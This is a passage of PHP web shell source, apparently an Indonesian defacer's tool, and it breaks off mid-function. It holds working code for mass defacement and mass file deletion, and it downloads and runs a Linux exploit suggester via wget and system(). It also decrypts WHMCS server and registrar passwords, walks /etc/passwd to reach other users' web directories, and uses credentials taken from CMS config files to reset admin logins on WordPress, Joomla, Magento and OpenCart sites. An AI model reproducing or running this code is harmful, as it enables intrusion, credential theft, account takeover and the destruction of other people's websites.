                    }
                    echo(".");
                }
                else{
                    echo("Range start number can't be bigger than the end number.");
                }
            }
            else if($_POST['port'] == "specific"){
                $list = explode(" ",$_POST['specific']);
                foreach($list as $i){
                    if(is_numeric($i)){
                        if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
                            if($first == "no")
                                echo(", ");
                            echo $i;
                            $first = "no";
                        }
                    }
                }
                echo(".");
            }
            else{
                for($i=0;$i>=0;$i++){
                    if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
                        if($first == "no")
                            echo(", ");
                        echo $i;
                        $first = "no";
                    }
                }
                echo(".");
            }
        }
 
}
elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=aqua>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}
elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=aqua><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=aqua><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
elseif($_GET['do'] == 'auto_cu_wp') {
if($_POST['gass']) {
	echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'wordpress');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_wp' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>WordPress Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/config/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_wp']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "P5yc050c14l";
		$pass = "P5yc050c14l";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "<font color=aqua>[</font> $target <font color=aqua>]</font></font><br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=aqua>$user</font><br>";
                    echo "[+] password: <font color=aqua>$pass</font><br><br>";     
                    
            	mysql_close($conn);
			}
		}
	} 	

}
elseif($_GET['do'] == 'auto_cu_joomla') {
if($_POST['gass']) {
	echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' style='width: 450px; height:250px;'>";
	UrlLoop($_POST['linkconf'],'joomla');	
	echo"</textarea><br>
		<input type='submit' style='width: 450px;' name='auto_cu_joomla' value='Hajar!!'>
		</form></center>";
}	else {
		echo "<center><h1>Joomla Auto Change User 2</h1>
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/config/'><br>
		<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
		</form></center>";
	}
if($_POST['auto_cu_joomla']) {
	
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$user = "P5yc050c14l";
		$pass = "P5yc050c14l";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
					echo "Config => ".$dir_config."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => Done , Username : <font color=aqua>$user</font> Password : <font color=aqua>$pass</font><br><br>";
					}
					mysql_close($conn);
					}
	} 	
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Nyodok Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=aqua>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sodok_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=aqua>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sodok_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sodokkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sodokmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sodok_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sodokkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sodokmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='psy.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'><title>./Mr_Psyc0 WAS HERE</title></head><body bgcolor=silver><center><img src=http://img11.deviantart.net/3bda/i/2015/196/a/8/slipknot_logo_design_by_alberth_kill2590-d91h8bd.png></center><br><br><br><br><center><font size=50><font color=red><i> HACKED by ./Mr.P5yc0 </i></font></center></textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	}elseif($_GET['do'] == 'root') {
system('wget -O lnx.pl https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl');
echo "<br><pre>";
echo system('perl lnx.pl');
echo "</pre><br>";
sleep("5");
unlink('lnx.pl');
} elseif($_GET['do'] == 'whmcs') {
echo'<form action="?dir=$dir&do=whmcs" method="post">
';
function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br>

<FORM method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS DECODER</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FF0000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
	

} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=aqua>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=aqua>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=aqua>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=aqua>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=aqua>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=aqua>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";

} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=aqua>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
